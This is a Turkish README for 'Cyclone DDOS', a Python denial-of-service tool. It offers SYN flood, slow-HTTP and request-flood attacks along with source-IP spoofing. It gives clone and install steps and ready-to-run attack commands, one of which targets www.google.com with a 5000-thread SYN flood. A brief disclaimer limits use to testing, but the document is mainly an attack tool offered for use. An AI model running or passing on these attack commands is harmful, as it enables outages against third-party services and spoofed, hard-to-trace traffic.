
# Cyclone DDOS

Cyclone DDOS, Python dilinde yazılmış bir DDoS (Distributed Denial of Service) saldırı aracıdır. Bu araç, hedef sunucularda yük oluşturmak için kullanılabilir. Kullanıcılar, farklı saldırı yöntemlerini (SynFlood, Pyslow, Request) seçebilir ve hedefinize çeşitli ayarlarla saldırabilirsiniz.

> **Uyarı:** Bu script sadece test ve eğitim amaçlı kullanılmalıdır. İzin almadan başkalarının sistemlerine saldırmak yasa dışıdır ve ciddi hukuki sonuçlar doğurabilir.

## Özellikler

- **Synflood Saldırısı**: Hedefe TCP SYN paketleri göndererek sunucu kaynaklarını tüketir.
- **Pyslow Saldırısı**: HTTP isteği göndererek sunucuyu yavaşlatır.
- **Request Saldırısı**: Hedefe yoğun HTTP istekleri gönderir.
- **Fake IP Kullanımı**: Sahte IP adresi oluşturabilir.
- **Açık Kaynak**: Proje GitHub üzerinden erişilebilir ve katkıda bulunulabilir.

## Gereksinimler

Cyclone DDOS, aşağıdaki Python kütüphanelerini gerektirir:

- `requests`
- `colorama`
- `termcolor`

Kütüphaneler, script çalıştırılmadan önce otomatik olarak yüklenecektir, ancak yükleme işlemi yapılmazsa, şu komutları kullanabilirsiniz:

### Linux (POSIX):
```bash
sudo pip install colorama termcolor requests
```

### Windows:
```bash
pip install colorama requests termcolor
```

## Kurulum

1. GitHub reposunu klonlayın veya dosyaları indirerek çalıştırmak için uygun bir dizine yerleştirin.

```bash
git clone https://github.com/mfurkanyazici/cycloneddos.git
cd cycloneddos
```

2. Gerekli bağımlılıkları yükleyin (yukarıdaki gereksinimlere bakın).

3. Scripti çalıştırın.

## Kullanım

Cyclone DDOS, komut satırı üzerinden çalıştırılabilir. İşte temel kullanım örnekleri:

### 1. Pyslow Saldırısı:
```bash
python cyclone.py -d www.example.com -p 80 -T 2000 -Pyslow
```

### 2. Request Saldırısı:
```bash
python cyclone.py -d www.domain.com -s 100 -Request
```

### 3. Synflood Saldırısı:
```bash
python cyclone.py -d www.google.com -Synflood -T 5000 -t 10
```

## Komut Satırı Seçenekleri

```bash
usage: cyclone.py -d [target] -p [port] -T [number threads]

optional arguments:
-h, --help       Show this help message and exit
-v, --version    Show program's version number and exit

options:
-d <ip|domain>   Specify your target (IP address or domain name)
-t <float>       Set timeout for socket (default: 5.0)
-T <int>         Set number of threads for the attack (default: 1000)
-p <int>         Specify the target port (default: 80) |Only required for Pyslow attack|
-s <int>         Set sleep time for reconnection (default: 100)
-i <ip address>  Specify spoofed IP address unless using fake IP
-Request         Enable request attack
-Synflood        Enable Synflood attack
-Pyslow          Enable Pyslow attack
--fakeip         Option to generate fake IP if no spoofed IP is specified
```

## Katkıda Bulunma

Author: mehmetfurkanyazici                                               
Github: http://github.com/mehmetfurkanyazici/cycloneddos

## Yazarlar

- **MeFu Security Team**

## Lisans

Cyclone DDOS, MIT lisansı altında lisanslanmıştır.
